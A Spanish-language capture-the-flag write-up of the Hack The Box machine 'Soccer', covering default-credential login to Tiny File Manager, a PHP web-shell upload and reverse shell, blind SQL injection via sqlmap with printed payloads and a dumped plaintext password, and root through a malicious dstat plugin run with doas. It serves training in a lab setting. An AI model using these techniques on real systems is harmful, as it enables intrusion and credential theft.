---
tags:
title: Soccer  - Easy (HTB)
permalink: /Soccer-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80,9091 10.129.236.43                                
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-24 13:59 -0500
Nmap scan report for soccer.htb (10.129.236.43)
Host is up (0.56s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Soccer - Index 
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Wed, 24 Dec 2025 19:01:15 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Wed, 24 Dec 2025 19:01:16 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|     </html>
|   RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Wed, 24 Dec 2025 19:01:18 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.98%I=7%D=12/24%Time=694C381B%P=x86_64-pc-linux-gnu%r(i
SF:nformix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\
SF:r\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\
SF:x20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r
SF:\nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-O
SF:ptions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nC
SF:ontent-Length:\x20139\r\nDate:\x20Wed,\x2024\x20Dec\x202025\x2019:01:15
SF:\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lan
SF:g=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n<
SF:/head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(H
SF:TTPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Po
SF:licy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143
SF:\r\nDate:\x20Wed,\x2024\x20Dec\x202025\x2019:01:16\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<m
SF:eta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>
SF:Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"H
SF:TTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-
SF:src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x2
SF:0text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Wed,
SF:\x2024\x20Dec\x202025\x2019:01:18\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"
SF:utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS
SF:\x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2
SF:F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")
SF:%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnec
SF:tion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.76 seconds
```

## Website 

La pagina principal no muestra mucha informacion.

![[Pasted image 20251224155916.png]]
### Feroxbuster

Gracias al escaneo de `feroxbuster` descubrí la ruta `tiny`.

```bash
feroxbuster -u http://soccer.htb

404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      494l     1440w    96128c http://soccer.htb/ground3.jpg
200      GET     2232l     4070w   223875c http://soccer.htb/ground4.jpg
200      GET      711l     4253w   403502c http://soccer.htb/ground2.jpg
200      GET      809l     5093w   490253c http://soccer.htb/ground1.jpg
200      GET      147l      526w     6917c http://soccer.htb/
301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/
301      GET        7l       12w      178c http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/
[####################] - 5m     90021/90021   0s      found:7       errors:0      
[####################] - 4m     30000/30000   132/s   http://soccer.htb/ 
[####################] - 4m     30000/30000   137/s   http://soccer.htb/tiny/ 
[####################] - 4m     30000/30000   137/s   http://soccer.htb/tiny/uploads/ 
```

## Tiny File manager

Veo que corre el servicio de Tiny file manager.

![[Pasted image 20251224201622.png]]
## Auth as admin 

Con solo realizar una busqueda en internet por las credenciales por defecto encuentro lo siguiente.

![[Pasted image 20251224201744.png]]
## Shell as www-data

Usándolas logro acceder al panel de administrador.

![[Pasted image 20251224160834.png]]

Veo una versión, para la cual para la misma hay un `exploit`.

```bash
searchsploit tiny file manager
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities                            | php/webapps/36364.txt
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager_OLD/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities                        | php/webapps/36365.txt
MCFileManager Plugin for TinyMCE 3.2.2.3 - Arbitrary File Upload                                                                                          | php/webapps/15768.txt
Tiny File Manager 2.4.6 - Remote Code Execution (RCE)                                                                                                     | php/webapps/50828.sh
TinyMCE MCFileManager 2.1.2 - Arbitrary File Upload                                                                                                       | php/webapps/15194.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

En mi caso no me funciono, por lo que lo hice manualmente.

### Manual exploitation

Básicamente puedo presionar en el botón de `uploads`, y subir un archivo malicioso `php` pero tiene que ser en la ruta `uploads` ya que de lo contrario me sale un error de que no tengo los permisos para escribir en otros directorios.

![[Pasted image 20251224161109.png]]

Y probando la ejecución veo que funciona.

![[Pasted image 20251224161115.png]]
### Shell

Por lo que para la reverse shell use el siguiente comando.

![[Pasted image 20251224161215.png]]

Y desde mi listener `nc` recibo la conexión como el usuario `www-data`.

```bash
 nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.236.43] 53122
whoami
www-data
```
## Shell as player

Buscando dentro de la maquina por archivos `SUID` veo que `doas` lo tiene asigando.
```bash
www-data@soccer:~/html/tiny$ find / -perm -4000 2>/dev/null 
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
```
### Doas configuration file

Además el propio `linpeas.sh` que puse a correr me lo detecto, el mismo tiene el archivo `conf` el cual dentro del mismo dice que el usuario `player` tiene la capacidad de ejecutar el binario de `dstat` como sudo sin utilizar la password de `root`.
Esto es bueno ya que `dstat` tiene plugins en Python los cuales puedo explotar una vez me convierta en el usuario `player`.

```bash
╔══════════╣ Doas Configuration
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#doas                                                                                                      
Doas binary found at: /usr/local/bin/doas                                                                                                                                                   
Doas binary has SUID bit set!
-rwsr-xr-x 1 root root 42224 Nov 17  2022 /usr/local/bin/doas
-e 
Checking doas.conf files:
Found: /usr/local/bin/../etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
Found: /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
-e 
Testing doas:
```

## soc-player.soccer.htb

Viendo los sitios y subdominios dentro del archivo de `nginx`, veo uno nuevo el cual no detecte antes.

```bash
www-data@soccer:/etc/nginx/sites-enabled$ cat soc-player.htb 
server {
  listen 80;
  listen [::]:80;

  server_name soc-player.soccer.htb;

  root /root/app/views;

  location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
  }
```

Lo agregue a mi `/etc/hosts` y me fui a la pagina.

![[Pasted image 20251224202838.png]]

En la seccion de `Tickets` veo que se me asigna un ticket, y dentro tengo un campo en el cual puedo ingresar el input, o mejor dicho, el `id` del ticket.

![[Pasted image 20251224203029.png]]

### SQL Injection

Veo que si ingreso el ticket valido me muestra el siguiente mensaje.

![[Pasted image 20251224203115.png]]

Y si no lo es..

![[Pasted image 20251224203128.png]]

Por lo que corri a `Burpsuite` y intente inyectando una `'`, lo cual me devolvio claramente el error de un ticket invalido, tambien me di cuenta que para detectar columnas, usando clausulas como `ORDER BY`, siempre me devolvia el mismo error, asi que hice una prueba manual con `UNION SELECT`, empezando primero con 2 columnas y asi creciendo.

![[Pasted image 20251224170720.png]]
### sqlmap

Como se que tengo 3 columnas, y no perder tiempo haciendo el proceso manual, ya que es una inyeccion a ciegas, basada en errores `(Error based)`, use `sqlmap`.

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data='{"id":"1"}' -p id --batch --level 5 --risk 3 --dbms=MySQL
<SNIP>
[15:25:27] [INFO] testing 'MySQL UNION query (38) - 81 to 100 columns'
[15:26:40] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[15:26:40] [INFO] checking if the injection point on (custom) POST parameter 'JSON id' is a false positive
(custom) POST parameter 'JSON id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 374 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"id":"-9185 OR 5650=5650"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 4205 FROM (SELECT(SLEEP(5)))RtMZ)"}
---
[15:28:15] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[15:28:41] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/soc-player.soccer.htb'
```

Liste tambien las bases de datos.

```bash
sqlmap -u ws://soc-player.soccer.htb:9091 --dbs --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10
<SNIP>
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```

Ahora las tablas, de las cuales solo existe una.

```bash
 sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db --tables --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10
<SNIP>
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
...[snip]...
```
### Credentials

Y el contenido de la misma.

```bash
sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db -T accounts --dump --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10
<SNIP>
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
<SNIP>
```

### Auth

Use las mismas para conectarme como el usuario `player`.
```
```bash
ssh player@soccer.htb 
player@soccer.htb's password: 
<SNIP>
player@soccer:~$ cat user.txt 
8a63d72e26131f54c3e576972404d5f8
```
## Shell as root

Como vi antes que mediante el uso de `doas` podía ejecutar `dstat` cree un plugin malicioso con el siguiente comando, ayudándome de la pagina de [GTFObins](https://gtfobins.github.io/gtfobins/dstat/#shell)

```bash
player@soccer:~$ mkdir -p ~/.dstat
player@soccer:~$ echo 'import os; os.execv("/bin/sh", ["sh"])' >~/.dstat/dstat_xxx.py
player@soccer:~$ dstat --xxx
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
$ whoami
player
$ exit
```

Probé que efectivamente me dio la shell pero como el usuario `player`, pero yo quiero como `root`
### Shell

Así que para eso use `doas` ejecutando como el usuario `root` el binarios de `dstat`.

```bash
player@soccer:~$ /usr/local/bin/doas -u root /usr/bin/dstat --xxx
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
# whoami
root
```

```bash
# cat /root/root.txt
787899002cb158c44a9c96363211a0c3
```

`~Happy Hacking.`